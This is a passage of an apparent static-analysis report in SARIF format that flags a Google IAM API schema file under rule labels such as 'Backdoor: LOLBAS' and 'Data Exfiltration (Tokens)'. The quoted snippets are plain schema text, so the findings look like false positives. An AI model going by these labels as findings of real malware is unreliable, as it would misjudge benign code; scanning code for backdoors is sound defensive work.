                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 69,
                  "endLine": 154,
                  "endColumn": 78,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n          \"description\": \"@OutputOnly The unique and stable id of the service account.\",\n          \"type\": \"string\"\n        },\n        \"email\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n          \"description\": \"@OutputOnly The unique and stable id of the service account.\",\n          \"type\": \"string\"\n        },\n        \"email\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n          \"description\": \"@OutputOnly The unique and stable id of the service account.\",\n          \"type\": \"string\"\n        },\n        \"email\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 73,
                  "endLine": 150,
                  "endColumn": 82,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"projectId\": {\n          \"description\": \"@OutputOnly The id of the project that owns the service account.\",\n          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"projectId\": {\n          \"description\": \"@OutputOnly The id of the project that owns the service account.\",\n          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"projectId\": {\n          \"description\": \"@OutputOnly The id of the project that owns the service account.\",\n          \"type\": \"string\"\n        },\n        \"uniqueId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 316,
                  "endLine": 146,
                  "endColumn": 325,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 50,
                  "endLine": 146,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n          \"type\": \"string\"\n        },\n        \"projectId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 592,
                  "endLine": 142,
                  "endColumn": 601,
                  "snippet": {
                    "text": "stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom ",
                    "rendered": {
                      "text": "stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom ",
                      "markdown": "`stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 350,
                  "endLine": 142,
                  "endColumn": 359,
                  "snippet": {
                    "text": "ntity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n ",
                    "rendered": {
                      "text": "ntity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n ",
                      "markdown": "`ntity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n      \"type\": \"object\",\n      \"properties\": {\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 255,
                  "endLine": 142,
                  "endColumn": 264,
                  "snippet": {
                    "text": "iceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` addres",
                    "rendered": {
                      "text": "iceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` addres",
                      "markdown": "`iceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` addres`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 97,
                  "endLine": 142,
                  "endColumn": 106,
                  "snippet": {
                    "text": " retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\",
                    "rendered": {
                      "text": " retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\",
                      "markdown": "` retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other methods can identify the service account using the format\\n`projects\\/{project}\\`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 23,
                  "endLine": 142,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      }\n        },\n        \"nextPageToken\": {\n          \"description\": \"To retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other method",
                    "rendered": {
                      "text": "      }\n        },\n        \"nextPageToken\": {\n          \"description\": \"To retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other method",
                      "markdown": "`      }\n        },\n        \"nextPageToken\": {\n          \"description\": \"To retrieve the next page of results, set\\nListServiceAccountsRequest.page_token\\nto this value.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"ServiceAccount\": {\n      \"id\": \"ServiceAccount\",\n      \"description\": \"A service account in the Identity and Access Management API.\\n\\nTo create a service account, specify the `project_id` and the `account_id`\\nfor the account.  The `account_id` is unique within the project, and is used\\nto generate the service account email address and a stable\\n`unique_id`.\\n\\nAll other method`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 46,
                  "endLine": 128,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n          \"description\": \"The list of matching service accounts.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccount\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n          \"description\": \"The list of matching service accounts.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccount\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n          \"description\": \"The list of matching service accounts.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccount\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 124,
                  "startColumn": 25,
                  "endLine": 124,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  \"schemas\": {\n    \"ListServiceAccountsResponse\": {\n      \"id\": \"ListServiceAccountsResponse\",\n      \"description\": \"The service account list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n",
                    "rendered": {
                      "text": "  \"schemas\": {\n    \"ListServiceAccountsResponse\": {\n      \"id\": \"ListServiceAccountsResponse\",\n      \"description\": \"The service account list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n",
                      "markdown": "`  \"schemas\": {\n    \"ListServiceAccountsResponse\": {\n      \"id\": \"ListServiceAccountsResponse\",\n      \"description\": \"The service account list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accounts\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 116,
                  "endLine": 10,
                  "endColumn": 125,
                  "snippet": {
                    "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                    "rendered": {
                      "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                      "markdown": "`  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 270,
                  "startColumn": 33,
                  "endLine": 270,
                  "endColumn": 41,
                  "snippet": {
                    "text": "          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n",
                    "rendered": {
                      "text": "          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n",
                      "markdown": "`          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 9,
                  "endLine": 266,
                  "endColumn": 19,
                  "snippet": {
                    "text": "      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n",
                    "rendered": {
                      "text": "      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n",
                      "markdown": "`      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n          \"description\": \"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\\ndefault output format.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 239,
                  "startColumn": 9,
                  "endLine": 239,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            \"TYPE_GOOGLE_CREDENTIALS_FILE\"\n          ]\n        },\n        \"privateKeyData\": {\n          \"description\": \"The private key data. Only provided in `CreateServiceAccountKey`\\nresponses.\",\n          \"type\": \"string\",\n          \"format\": \"byte\"\n",
                    "rendered": {
                      "text": "            \"TYPE_GOOGLE_CREDENTIALS_FILE\"\n          ]\n        },\n        \"privateKeyData\": {\n          \"description\": \"The private key data. Only provided in `CreateServiceAccountKey`\\nresponses.\",\n          \"type\": \"string\",\n          \"format\": \"byte\"\n",
                      "markdown": "`            \"TYPE_GOOGLE_CREDENTIALS_FILE\"\n          ]\n        },\n        \"privateKeyData\": {\n          \"description\": \"The private key data. Only provided in `CreateServiceAccountKey`\\nresponses.\",\n          \"type\": \"string\",\n          \"format\": \"byte\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 229,
                  "startColumn": 33,
                  "endLine": 229,
                  "endColumn": 41,
                  "snippet": {
                    "text": "GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"TYPE_UNSPECIFIED\",\n            \"TYPE_PKCS12_FILE\",\n            \"TYPE_GOO",
                    "rendered": {
                      "text": "GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"TYPE_UNSPECIFIED\",\n            \"TYPE_PKCS12_FILE\",\n            \"TYPE_GOO",
                      "markdown": "`GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n          \"enumDescriptions\": [\n            \"Unspecified. Equivalent to `TYPE_GOOGLE_CREDENTIALS_FILE`.\",\n            \"PKCS12 format.\\nThe password for the PKCS12 file is `notasecret`.\\nFor more information, see https:\\/\\/tools.ietf.org\\/html\\/rfc7292.\",\n            \"Google Credentials File format.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"TYPE_UNSPECIFIED\",\n            \"TYPE_PKCS12_FILE\",\n            \"TYPE_GOO`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 9,
                  "endLine": 225,
                  "endColumn": 19,
                  "snippet": {
                    "text": "h2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n          \"description\": \"The output format for the private key.\\nOnly provided in `CreateServiceAccountKey` responses, not\\nin `GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n ",
                    "rendered": {
                      "text": "h2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n          \"description\": \"The output format for the private key.\\nOnly provided in `CreateServiceAccountKey` responses, not\\nin `GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n ",
